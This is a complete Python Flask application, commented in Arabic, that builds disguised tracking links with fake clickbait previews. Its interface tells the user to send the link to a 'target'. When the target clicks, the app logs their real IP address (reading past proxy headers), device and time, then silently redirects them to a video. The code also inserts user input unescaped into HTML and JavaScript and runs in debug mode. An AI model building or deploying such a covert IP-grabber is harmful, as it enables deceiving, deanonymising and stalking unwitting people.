from flask import Flask, render_template_string, request, redirect, jsonify
import uuid
import datetime

app = Flask(__name__)

# قواعد بيانات مؤقتة في الذاكرة لتخزين الروابط والسجلات
links_db = {}
logs_db = {}

# واجهة المستخدم لإدخال البيانات من الهاتف
HTML_INTERFACE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم | منشئ الروابط</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f6f9; color: #333; padding: 20px; }
        .container { max-width: 500px; background: white; margin: 0 auto; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        input, button { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { background-color: #28a745; color: white; border: none; font-size: 16px; cursor: pointer; }
        .result-box { background: #e9ecef; padding: 15px; border-radius: 4px; margin-top: 20px; word-break: break-all; }
    </style>
</head>
<body>
    <div class="container">
        <h2>إنشاء رابط تتبع مموه</h2>
        <form action="/create" method="POST">
            <label>1. الرابط الحقيقي المتوجه إليه (يوتيوب/تيك توك):</label>
            <input type="url" name="original_url" placeholder="https://..." required>
            
            <label>2. العنوان المموه للمعاينة (Title):</label>
            <input type="text" name="title" placeholder="مثال: شاهد هذا المقطع الصادم!" required>
            
            <label>3. وصف الفيديو (Description):</label>
            <input type="text" name="description" placeholder="مثال: تم نشره قبل قليل..." required>
            
            <label>4. رابط الصورة المصغرة (Image URL):</label>
            <input type="url" name="image" placeholder="ضع رابط صورة حقيقية ينتهي بـ .jpg أو .png" required>
            
            <button type="submit">توليد الرابط الذكي</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_INTERFACE)

@app.route('/create', methods=['POST'])
def create_link():
    original_url = request.form.get('original_url')
    title = request.form.get('title')
    description = request.form.get('description')
    image = request.form.get('image')
    
    # توليد معرف فريد عشوائي للرابط
    link_id = str(uuid.uuid4())[:8] 
    
    # حفظ كل المعطيات يدوياً لتفادي الحظر
    links_db[link_id] = {
        'url': original_url,
        'title': title,
        'description': description,
        'image': image
    }
    logs_db[link_id] = []
    
    tracking_link = f"{request.host_url}watch/{link_id}"
    stats_link = f"{request.host_url}analytics/{link_id}"
    
    result_page = f'''
    <div style="max-width:500px; margin:50px auto; font-family:Arial; direction:rtl; padding:20px; border:1px solid #ccc;">
        <h3>تم توليد الروابط بنجاح!</h3>
        <p><b>رابط التمويه (أرسله للمستهدف):</b><br><input type="text" value="{tracking_link}" style="width:100%; padding:10px;" readonly></p>
        <p><b>رابط الإحصائيات (الـ IP والبيانات):</b><br><input type="text" value="{stats_link}" style="width:100%; padding:10px;" readonly></p>
        <br><a href="/">إنشاء رابط جديد</a>
    </div>
    '''
    return result_page

@app.route('/watch/<link_id>')
def watch_video(link_id):
    if link_id in links_db:
        # تصفية وجلب الـ IP الفعلي حتى لو كان خلف خوادم الاستضافة Proxy
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip_address and ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
            
        user_agent = request.headers.get('User-Agent')
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # حفظ السجل
        logs_db[link_id].append({
            "ip": ip_address,
            "device": user_agent,
            "time": current_time
        })
        
        data = links_db[link_id]
        
        # إرجاع وسوم المعاينة والتوجيه الفوري بالجافا سكريبت
        return f'''
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta property="og:title" content="{data['title']}">
            <meta property="og:description" content="{data['description']}">
            <meta property="og:image" content="{data['image']}">
            <meta property="og:type" content="video.other">
            <meta property="og:url" content="{request.url}">
            <title>{data['title']}</title>
            <script>
                // تحويل الزائر فوراً إلى الرابط الحقيقي دون تأخير
                window.location.href = "{data['url']}";
            </script>
        </head>
        <body>
            <p>جاري تحميل محتوى الفيديو...</p>
        </body>
        </html>
        '''
    return "الرابط غير موجود", 404

@app.route('/analytics/<link_id>')
def analytics(link_id):
    if link_id in logs_db:
        return jsonify({
            "total_clicks": len(logs_db[link_id]),
            "clicks": logs_db[link_id]
        })
    return "معرف غير صحيح", 404

if __name__ == '__main__':
    app.run(debug=True)
